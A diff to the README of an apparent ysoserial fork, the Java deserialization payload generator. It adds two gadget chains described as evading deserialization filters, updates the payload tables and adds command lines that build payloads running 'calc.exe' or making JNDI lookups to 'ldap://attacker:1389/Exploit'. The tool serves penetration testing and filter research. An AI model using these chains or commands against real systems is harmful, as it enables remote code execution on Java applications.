@@ -17,7 +17,7 @@ Standard deserialization filters (JEP 290, custom `ObjectInputFilter`) typically
 |-------------|--------|-----------------|
 | `ConcurrentHashMap` | CC10, CC11, ROME4, Hibernate3, ROMEJndi | Rarely blocked — used extensively in JDK internals |
 | `TreeBag` | CB3 | CC4-specific class, not in standard filter lists |
-| `LinkedHashSet` | CC12 | Extends HashSet but class-level filters often miss it |
+| `LinkedHashSet` | CC12, CC13 | Extends HashSet but class-level filters often miss it |
 | `TreeSet` | Click2, BeanShell2 | Standard JDK class, never blocked in known filters |
 | `BadAttributeValueExpException` | ROME2 | JMX class, not commonly filtered |
 | `Hashtable` | ROME3 | Some filters miss this older Map implementation |
@@ -29,6 +29,7 @@ These chains work without `--add-opens java.xml` by using JNDI sinks instead of 
 | Chain | Sink | Usage |
 |-------|------|-------|
 | `CommonsCollectionsJndi` | `InitialContext.doLookup()` | `java -jar ysoserial.jar CommonsCollectionsJndi 'ldap://attacker/Exploit'` |
+| `CommonsCollectionsJndi2` | CC4+CC3 cross-lib → `doLookup()` | `java -jar ysoserial.jar CommonsCollectionsJndi2 'ldap://attacker/Exploit'` |
 | `ROMEJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar ROMEJndi 'ldap://attacker/Exploit'` |
 | `CommonsBeanutilsJndi` | `JdbcRowSetImpl` → JNDI | `java -jar ysoserial.jar CommonsBeanutilsJndi 'ldap://attacker/Exploit'` |
 | `CommonsBeanutilsJndi2` | `JdbcRowSetImpl` → JNDI | CB + CC4 variant |
@@ -50,8 +51,10 @@ These chains work without `--add-opens java.xml` by using JNDI sinks instead of 
 | `CommonsBeanutils4` | CB + JdbcRowSetImpl JNDI sink — no TemplatesImpl, JDK 17+ compatible |
 | `Click2` | Apache Click via TreeSet entry — bypasses PriorityQueue filters |
 | `BeanShell2` | BeanShell interpreter via TreeSet entry — bypasses PriorityQueue filters |
+| `CommonsCollections13` | CC4 TiedMapEntry + CC3 LazyMap + LinkedHashSet — double evasion (cross-library + root bypass) |
+| `CommonsCollectionsJndi2` | CC4 TiedMapEntry + CC3 LazyMap + JNDI sink — cross-library filter evasion |
 
-## All Payloads (65 total)
+## All Payloads (67 total)
 
 ```
 Payload                Authors                                Dependencies
@@ -85,7 +88,9 @@ CommonsCollections9    @meizjm3i                              commons-collection
 CommonsCollections10   @BofeiC                                commons-collections:3.1
 CommonsCollections11   @BofeiC                                commons-collections4:4.0
 CommonsCollections12   @BofeiC                                commons-collections:3.1
+CommonsCollections13   @BofeiC                                commons-collections:3.1, commons-collections4:4.0
 CommonsCollectionsJndi @BofeiC                                commons-collections:3.1
+CommonsCollectionsJndi2 @BofeiC                               commons-collections:3.1, commons-collections4:4.0
 FileUpload1            @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
 Groovy1                @frohoff                               groovy:2.3.9
 GroovyGStr             @BofeiC                                groovy:2.4.3
@@ -158,6 +163,12 @@ java -jar ysoserial.jar CommonsCollectionsJndi 'ldap://attacker:1389/Exploit' > 
 
 # Filter bypass: ConcurrentHashMap entry instead of HashMap/HashSet
 java -jar ysoserial.jar CommonsCollections10 'calc.exe' > payload.bin
+
+# Cross-library evasion: CC4 TiedMapEntry + CC3 LazyMap (evades version-specific filters)
+java -jar ysoserial.jar CommonsCollections13 'calc.exe' > payload.bin
+
+# Cross-library + JNDI sink
+java -jar ysoserial.jar CommonsCollectionsJndi2 'ldap://attacker:1389/Exploit' > payload.bin
 
 # Nested wrapper to bypass first-layer type filters
 java -jar ysoserial.jar SignedObjectWrap 'calc.exe' > payload.bin
